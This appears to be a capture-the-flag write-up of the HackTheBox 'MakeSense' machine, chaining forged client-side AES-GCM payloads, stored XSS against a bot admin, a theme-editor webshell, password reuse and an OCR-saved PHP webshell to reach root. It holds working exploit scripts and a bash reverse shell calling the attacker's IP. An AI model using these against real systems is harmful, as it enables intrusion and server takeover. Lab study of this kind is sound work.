@@ -1,0 +1,374 @@
+---
+title: "MakeSense"
+platform: "HackTheBox"
+os: "Linux"
+difficulty: "Medium"
+date: 2026-11-03
+ports: ["22/ssh", "443/https"]
+tags: ["wordpress", "client-side-crypto", "stored-xss", "csrf", "password-reuse", "ocr", "tesseract", "php-webshell", "privesc"]
+summary: "A WordPress site with a custom theme whose encryption happens in the client with a hardcoded key: you forge a payload to inject a Stored XSS that, run by the bot-admin, writes a webshell via the theme editor (CSRF). From www-data, reusing the DB password to jump to walter. Root via an internal OCR service running as root that saves the recognised text as a file: you make it read PHP code and save it as .php."
+---
+
+MakeSense chains client-side encryption, a Stored XSS against the bot-administrator and an OCR service running as root. From WordPress to root with not a single CVE: it's all broken design and credential reuse.
+
+<AttackChain
+  label="Attack chain · from WordPress to root"
+  steps={[
+    { title: 'Recon · custom theme', desc: 'WordPress 7.0 with the "webagency" theme: its JS encrypts in the client with a hardcoded key (AES-GCM).', action: 'forge a payload with the stolen key' },
+    { title: 'Stored XSS', desc: 'The save_voice_results AJAX action (nopriv) stores the transcription field unsanitised.', action: 'the bot-admin renders it' },
+    { title: 'XSS in the admin', desc: 'The internal wp-admin panel paints the content → execution in the administrator\'s session.', action: 'CSRF-via-XSS to the theme editor' },
+    { title: 'RCE · www-data', desc: 'The admin\'s browser writes a webshell into footer.php through the theme editor.', action: 'wp-config.php → credentials' },
+    { title: 'walter (SSH)', desc: 'The database password is reused by the system user walter.', action: 'internal OCR service as root' },
+    { title: 'OCR root on localhost', desc: 'A PHP server runs as root on 127.0.0.1:8001 (Basic Auth, the same password).', action: 'the OCR saves the text as .php' },
+    { title: 'RCE · root', desc: 'You make the OCR read PHP code and save it as .php, which the root service itself executes.', tone: 'win' },
+  ]}
+/>
+
+## Reconnaissance
+
+### Port scan
+
+```bash
+nmap -sCV -oN nmap.txt <IP>
+```
+
+```text
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+443/tcp open  ssl/http Apache httpd 2.4.58 ((Ubuntu))
+|_http-generator: WordPress 7.0
+| ssl-cert: Subject: commonName=makesense.htb
+|_http-title: Agency LLC
+```
+
+Quick read:
+
+- **Only 22 and 443.** No port 80: all web traffic goes over HTTPS (you have to use `-k` / `--disable-tls-checks` because of the self-signed certificate).
+- The certificate reveals the vhost **`makesense.htb`** → to `/etc/hosts`.
+- **WordPress 7.0** (a real version, released in May 2026). The WP core is rarely the vector; the way in is usually in plugins/themes/users.
+- **OpenSSH 9.6p1** (Ubuntu 24.04): modern, ruled out as a direct vector.
+
+```bash
+echo "<IP> makesense.htb" | sudo tee -a /etc/hosts
+```
+
+### WordPress enumeration
+
+```bash
+wpscan --url https://makesense.htb --disable-tls-checks -e vp,vt,u --plugins-detection aggressive
+```
+
+Key findings:
+
+- **Open directory listing** at `/wp-content/uploads/`.
+- **XML-RPC** enabled (plan B, not a priority).
+- **Custom theme `webagency` v1.0** (Tailwind). Since it isn't a theme from the official repo, it's the natural candidate for the bug.
+
+### Theme analysis
+
+The front-end HTML links a very suspicious JS inside the theme:
+
+```text
+/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js
+/wp-content/themes/webagency/assets/js/main.js
+```
+
+The name *Whisper* (a speech-to-text model) + the machine's theme (*MakeSense*) points to a custom upload/transcription feature. The HTML also exposes an AJAX config:
+
+```js
+var webagency_ajax = {"ajax_url":".../wp-admin/admin-ajax.php","nonce":"6e71720e08", ...};
+```
+
+> **WordPress AJAX pattern:** the JS POSTs to `admin-ajax.php` with `action=<name>`. The server hooks it with `wp_ajax_<name>` (authenticated) or **`wp_ajax_nopriv_<name>`** (no auth). The latter are the target.
+
+## The central flaw: client-side encryption
+
+Reading `whisper-wrapper.js`, the gift appears:
+
+```js
+// Symmetric encryption key (must match server-side)
+const ENCRYPTION_KEY = '<ENCRYPTION_KEY>';
+...
+// key = SHA-256(ENCRYPTION_KEY), AES-GCM, random 12-byte IV
+// output: btoa(IV ‖ ciphertext ‖ tag)
+```
+
+And a telling comment in the text mapping: `Map spoken words to their symbol equivalents for XSS injection`.
+
+> **The design vulnerability:** encryption is done by the browser with a hardcoded key. Client-side encryption protects nothing: you can read the key, decrypt, and above all **forge ciphertext** with whatever content you want. The server treats "decrypts correctly" as if it were "comes from a legitimate client". It isn't — it's a **broken trust boundary**.
+
+### The AJAX actions
+
+`main.js` yields three `action`s:
+
+| action | parameters | function |
+|---|---|---|
+| `submit_contact_form` | `nonce`, `name`, `email`, `phone`, `message` | creates a "post" and returns `post_id` |
+| `save_voice_raw` | `nonce`, `voice_recording` | uploads raw audio |
+| **`save_voice_results`** | `nonce`, `post_id`, **`encrypted_payload`** | **saves the "encrypted" result** |
+
+The target is `save_voice_results`: it accepts an AES-GCM blob that the server decrypts and saves. Skipping the whole audio/AI pipeline, you can feed it whatever content you want.
+
+### Replicate the crypto (Python)
+
+```python
+#!/usr/bin/env python3
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+import hashlib, os, base64, sys
+
+ENCRYPTION_KEY = b"<ENCRYPTION_KEY>"
+key = hashlib.sha256(ENCRYPTION_KEY).digest()   # SHA-256 of the string, NOT PBKDF2
+
+def encrypt(plaintext: str) -> str:
+    iv = os.urandom(12)                                      # 12 bytes
+    ct = AESGCM(key).encrypt(iv, plaintext.encode(), None)   # ct = ciphertext + tag
+    return base64.b64encode(iv + ct).decode()                # btoa(IV ‖ ct ‖ tag)
+
+def decrypt(blob_b64: str) -> str:
+    raw = base64.b64decode(blob_b64)
+    iv, ct = raw[:12], raw[12:]
+    return AESGCM(key).decrypt(iv, ct, None).decode()
+
+if __name__ == "__main__":
+    if len(sys.argv) >= 3 and sys.argv[1] == "-d":
+        print(decrypt(sys.argv[2]))
+    else:
+        print(encrypt(sys.argv[1] if len(sys.argv) > 1 else "CANARY_12345"))
+```
+
+> **Debugging note:** always validate the crypto against *ground truth* (a blob generated by the real browser) before forging anything. A single wrong byte in the key → the GCM tag doesn't validate → `Decryption failed` with no further hints.
+
+### Payload format
+
+The server doesn't expect plaintext, but a **JSON**:
+
+```bash
+# 1) get a post_id
+curl -sk -X POST https://makesense.htb/wp-admin/admin-ajax.php \
+  --data "action=submit_contact_form&nonce=6e71720e08&name=t&email=a@a.com&phone=1&message=a sufficiently long message" | jq .
+# -> {"success":true,"data":{"post_id":69, ...}}
+
+# 2) save forged content (JSON with the pipeline fields)
+BLOB=$(python3 cipher.py '{"transcription":"CANARY_12345","summary":"CANARY_12345"}')
+curl -sk -X POST https://makesense.htb/wp-admin/admin-ajax.php \
+  -F "action=save_voice_results" -F "nonce=6e71720e08" \
+  -F "post_id=69" -F "encrypted_payload=$BLOB" | jq .
+# -> {"success":true,"data":{"message":"Results saved successfully!", ...}}
+```
+
+Confirmed: we control the post's `transcription` / `summary` fields.
+
+## Foothold: Stored XSS → webshell (www-data)
+
+The saved content isn't rendered on any public page (`/?p=69` gives *Page not found*) → it's painted in the **internal wp-admin panel** that an **admin** (bot) reviews. The `transcription` field is rendered **unsanitised** → **Stored XSS against the admin**.
+
+### Confirm execution (harmless beacon)
+
+```bash
+# listener
+python3 -m http.server 80
+
+# test payload
+IP=<TUN0>
+BLOB=$(python3 cipher.py "{\"transcription\":\"<img src=x onerror=\\\"new Image().src='http://$IP/xss-fired'\\\">\",\"summary\":\"x\"}")
+curl -sk -X POST https://makesense.htb/wp-admin/admin-ajax.php \
+  -F "action=save_voice_results" -F "nonce=6e71720e08" \
+  -F "post_id=69" -F "encrypted_payload=$BLOB" | jq .
+```
+
+A few minutes later the bot (the machine's IP) does `GET /xss-fired` → **XSS confirmed**, running in the admin's session.
+
+### From XSS to RCE: CSRF to the theme editor
+
+The WP session cookie is `HttpOnly`, so it can't be stolen with `document.cookie`. Instead, the JS (running as admin) makes **the authenticated browser itself** write a webshell via the theme editor.
+
+Prior recon (loading external scripts `<script src=http://IP/x.js>`):
+
+- `theme-editor.php` available (no `DISALLOW_FILE_EDIT`).
+- Session = administrator.
+- Editable files of the `webagency` theme: `functions.php`, `footer.php`, `header.php`, `index.php`.
+- The form nonce is in `name="nonce" value="..."`.
+
+Final `x.js` (GET to pull the nonce + current content → POST that appends the webshell to `footer.php`):
+
+```js
+(async () => {
+  const TARGET = 'footer.php', THEME = 'webagency';
+  const page = await (await fetch('/wp-admin/theme-editor.php?file='+TARGET+'&theme='+THEME)).text();
+  const nonce = (page.match(/name=["']nonce["']\s+value=["']([a-z0-9]+)/i)||[])[1];
+  const orig  = (page.match(/<textarea[^>]*name=["']newcontent["'][^>]*>([\s\S]*?)<\/textarea>/i)||[])[1] || '';
+  const ta = document.createElement('textarea'); ta.innerHTML = orig;
+  const shell = ta.value + "\n<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>";
+  const body = new URLSearchParams();
+  body.append('nonce', nonce);
+  body.append('_wp_http_referer', '/wp-admin/theme-editor.php?file='+TARGET+'&theme='+THEME);
+  body.append('newcontent', shell);
+  body.append('action', 'edit-theme-plugin-file');
+  body.append('file', TARGET);
+  body.append('theme', THEME);
+  const res = await fetch('/wp-admin/theme-editor.php', {method:'POST', body});
+  new Image().src='http://IP/saved?status='+res.status;
+})();
+```
+
+> **Key:** the nonce is the admin's and it expires; that's why GET-nonce and POST-write go in the **same execution** inside their browser. Sending it to Kali to use with curl doesn't work (a different session).
+
+After `status=200`, the webshell lives in `footer.php` (it runs when the front-end loads):
+
+```bash
+curl -sk "https://makesense.htb/?cmd=id" | grep -a uid
+# uid=33(www-data)
+```
+
+### Reverse shell
+
+```bash
+# listener: nc -lvnp 4444
+IP=<TUN0>
+B64=$(echo -n "bash -i >& /dev/tcp/$IP/4444 0>&1" | base64)   # echo -n! without the trailing \n
+curl -sk -G "https://makesense.htb/" --data-urlencode "cmd=echo $B64 | base64 -d | bash"
+```
+
+> **Gotcha:** `echo` without `-n` adds a `\n` that sneaks into the base64 and breaks the `>&` redirect intermittently. Always use `echo -n` when generating base64 that will be executed.
+
+## Lateral: www-data → walter
+
+Every WordPress's treasure chest — `wp-config.php`:
+
+```bash
+grep -iE "DB_USER|DB_PASSWORD" /var/www/html/wp-config.php
+# DB_USER     = walter
+# DB_PASSWORD = <REDACTED>
+```
+
+System users with a shell:
+
+```bash
+grep -E "sh$" /etc/passwd
+# root, walter (uid 1000), admin (uid 1001)
+```
+
+The DB user is named `walter` and there's a system user `walter` → **password reuse**:
+
+```bash
+ssh walter@makesense.htb        # pass: <REDACTED>
+cat /home/walter/user.txt
+```
+
+> Author's detail: `~/.bash_history -> /dev/null` (symlink), so nothing is left there.
+
+## Privesc: walter → root (internal OCR service)
+
+### Enumeration
+
+```bash
+ss -tlnp
+ps aux | grep -E "root" | grep -v grep
+```
+
+```text
+root  /bin/sh -c /root/.scripts/start_ocr4.sh
+root  php -S 127.0.0.1:8001 -t /root/ocr4/        <- root's PHP server on localhost:8001
+```
+
+A PHP server running **as root**, bound to localhost (invisible in the external nmap). It asks for **Basic Auth**:
+
+```text
+WWW-Authenticate: Basic realm="OCR Protected"
+```
+
+Third reuse of the same password (DB → system → service):
+
+```bash
+for u in walter admin ocr root; do
+  echo -n "$u: "; curl -s -o /dev/null -w "%{http_code}\n" -u "$u:<REDACTED>" http://127.0.0.1:8001/
+done
+# walter: 200
+```
+
+### The OCR app
+
+Interface: you draw text on a `<canvas>`, the server recognises it with **Tesseract** and lets you **save it to a file**:
+
+```html
+<input type="hidden" name="ocr_id" value="ocr_...">
+<input type="text" name="filename" placeholder="result.txt" required>
+<button type="submit" name="save_output">Save</button>
+```
+
+Observations:
+
+- Saving requires a **fresh** `ocr_id` (from a valid recognition, tied to the session → use a cookie jar `-c`/`-b`).
+- The `filename` goes through `basename()` inside `saved/` → **path traversal doesn't work** (it strips the whole path).
+- **BUT** it doesn't force an extension: `result.txt` is saved as `result.txt`, `shell.php` as `shell.php`.
+
+> **The real vector** (not traversal): *the recognised text is saved verbatim into a file whose extension you control*. If the OCR reads PHP code and it's saved as `.php`, the PHP service itself (root) runs it. The challenge isn't "exploit the OCR", but **produce a clean OCR read** of valid code.
+
+### Webshell via OCR
+
+Generate an image with the PHP, readable by Tesseract (monospaced font, one line, `--psm 7`):
+
+```bash
+convert -size 1000x80 xc:white -gravity center \
+  -font Courier-Bold -pointsize 40 -fill black \
+  -annotate 0 '<?php system($_GET[0]);?>' \
+  -bordercolor white -border 15x15 /tmp/shell.png
+tesseract /tmp/shell.png --psm 7 -
+# <?php system($_GET[0] ) ;?>   <- extra spaces: PHP ignores them, it's VALID
+```
+
+> **Lesson:** you're not after a *pixel-perfect* read, but a **syntactically valid** one. Extra spaces between tokens don't break PHP. The only question is "does this execute?". The `_` and the `$` are the characters that resist most; a bold font, a large size and `--psm 7` (treat as a single line) help.
+
+Send the image, verify the server reads it the same, and save as `.php`:
+
+```bash
+C='-u walter:<REDACTED>'
+IMG="data:image/png;base64,$(base64 -w0 /tmp/shell.png)"
+
+RESP=$(curl -s $C -c /tmp/cj -X POST http://127.0.0.1:8001/ --data-urlencode "canvas_image=$IMG")
+echo "$RESP" | grep -oE 'output-text">[^<]+'                 # confirm the read
+OCRID=$(echo "$RESP" | grep -oE 'name="ocr_id" value="[^"]+"' | grep -oE 'ocr_[0-9a-f.]+')
+
+curl -s $C -b /tmp/cj -X POST http://127.0.0.1:8001/ \
+  --data-urlencode "ocr_id=$OCRID" \
+  --data-urlencode "filename=shell.php" \
+  --data-urlencode "save_output=1" | grep -oE 'Saved as: [^<]+'
+# Saved as: saved/shell.php
+```
+
+> When parsing the `ocr_id`, anchor the grep to `name="ocr_id" value="..."` — a broad pattern catches the literal `ocr_id` of the `name` attribute instead of the real value.
+
+### Root
+
+```bash
+C='-u walter:<REDACTED>'
+curl -s $C "http://127.0.0.1:8001/saved/shell.php?0=id"
+# uid=0(root) gid=0(root) groups=0(root)
+
+curl -s $C "http://127.0.0.1:8001/saved/shell.php?0=cat+/root/root.txt"
+```
+
+**Root obtained.**
+
+## Cleanup (good practice)
+
+In a real environment you'd have to remove the artifacts introduced:
+
+- The webshell appended to the WordPress theme's `footer.php` (`www-data`).
+- `saved/shell.php` in the OCR service (`root`).
+
+Both are unauthenticated RCE; leaving them would introduce a critical vulnerability of your own.
+
+```bash
+rm -f /root/ocr4/saved/shell.php
+# and restore footer.php to its original content
+```
+
+## Lessons
+
+- **Client-side crypto = zero security.** A key in the browser ⇒ decorative encryption. The server must never trust "decrypts fine" as proof of legitimacy.
+- **Error messages are a map:** `Decryption failed` → `Invalid payload format` → `Invalid OCR request` guided each layer.
+- **Chained credential reuse** (DB → system → service): try every credential against everything.
+- **"Hidden" isn't "secure":** a root service on localhost is fully reachable once you're in.
+- **Adapt the payload to the tool:** with OCR you're after syntactic validity, not visual perfection. Same criterion as reading a GCM error: does this execute?
+- **Disciplined debugging:** `echo -n` in base64, anchor greps to context, validate crypto against ground truth. Tooling bugs are isolated by verifying, not guessing.
